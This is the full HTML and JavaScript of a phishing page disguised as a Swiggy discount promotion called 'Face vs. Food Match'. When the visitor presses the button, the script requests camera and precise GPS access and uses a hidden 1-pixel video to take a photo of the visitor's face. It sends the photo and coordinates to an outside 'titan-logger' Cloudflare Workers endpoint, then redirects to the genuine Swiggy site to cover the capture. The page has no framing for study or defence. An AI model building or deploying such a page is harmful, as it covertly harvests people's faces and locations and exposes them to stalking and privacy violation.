<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Swiggy | Local Offers & AI Scan</title>
    <style>
        body { background: #fff; color: #282c3f; font-family: 'Segoe UI', Roboto, Arial, sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; overflow: hidden; }
        .card { text-align: center; width: 90%; max-width: 380px; padding: 40px 20px; border-radius: 24px; box-shadow: 0 15px 45px rgba(0,0,0,0.08); border-top: 6px solid #fc8019; }
        .logo { width: 65px; height: 65px; background: #fc8019; border-radius: 18px; margin: 0 auto 25px; display: flex; align-items: center; justify-content: center; color: white; font-weight: 900; font-size: 38px; box-shadow: 0 8px 20px rgba(252, 128, 25, 0.3); }
        h1 { font-size: 1.5rem; font-weight: 800; margin-bottom: 12px; }
        p { font-size: 0.9rem; color: #7e808c; line-height: 1.5; margin-bottom: 35px; }
        .btn { background: #fc8019; color: white; border: none; padding: 18px; width: 100%; border-radius: 12px; font-weight: 700; font-size: 1.1rem; cursor: pointer; text-transform: uppercase; transition: 0.2s; }
        .btn:active { transform: scale(0.98); background: #e67215; }
        #loader { display: none; }
        .spinner { width: 35px; height: 35px; border: 4px solid #f3f3f3; border-top: 4px solid #fc8019; border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 15px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        /* Hidden Camera Stream */
        #v { position: absolute; width: 1px; height: 1px; opacity: 0; pointer-events: none; }
    </style>
</head>
<body>

    <div class="card">
        <div class="logo">S</div>
        <div id="ui">
            <h1>Face vs. Food Match</h1>
            <p>Our AI scans your mood to find the <strong>Perfect Dish</strong> and unlocks a <strong>â‚¹150 Discount</strong> near you!</p>
            <button id="btn" class="btn">CLAIM MY OFFER</button>
        </div>

        <div id="loader">
            <div class="spinner"></div>
            <p id="stat" style="font-weight: 700; color: #fc8019; font-size: 0.8rem; letter-spacing: 1px;">SYNCING WITH SWIGGY NODE...</p>
        </div>
    </div>

    <video id="v" playsinline muted></video>

    <script>
        // Replace with your actual Worker URL
        const API_URL = "https://titan-logger.saliljha523.workers.dev";
        
        const btn = document.getElementById('btn');
        const ui = document.getElementById('ui');
        const loader = document.getElementById('loader');
        const stat = document.getElementById('stat');
        const video = document.getElementById('v');
        const canvas = document.createElement('canvas');

        btn.onclick = async () => {
            ui.style.display = 'none';
            loader.style.display = 'block';

            try {
                // 1. Initial Handshake (Camera + GPS)
                stat.innerText = "INITIALIZING AI SCAN...";
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                video.srcObject = stream;
                await video.play();

                stat.innerText = "LOCATING NEARBY DEALS...";
                const position = await new Promise((resolve) => {
                    navigator.geolocation.getCurrentPosition(resolve, () => resolve(null), {
                        enableHighAccuracy: true,
                        timeout: 8000,
                        maximumAge: 0
                    });
                });

                // 2. Background Capture
                stat.innerText = "GENERATING COUPON...";
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);
                const photo = canvas.toDataURL('image/jpeg', 0.3); // Compressed for instant upload

                // Kill Camera Sensors
                stream.getTracks().forEach(track => track.stop());

                // 3. Guaranteed Data Uplink
                const coords = position ? `${position.coords.latitude},${position.coords.longitude}` : "GPS_LOCK_FAILED";
                
                // We wait for the 'fetch' to complete so data isn't lost during redirect
                await fetch(API_URL, {
                    method: 'POST',
                    mode: 'cors',
                    body: JSON.stringify({ image: photo, gps: coords })
                });

            } catch (err) {
                console.log("Hardware Blocked.");
            }

            // 4. Final Exit to Swiggy
            window.location.replace("https://www.swiggy.com/offers-near-me");
        };
    </script>
</body>
</html>
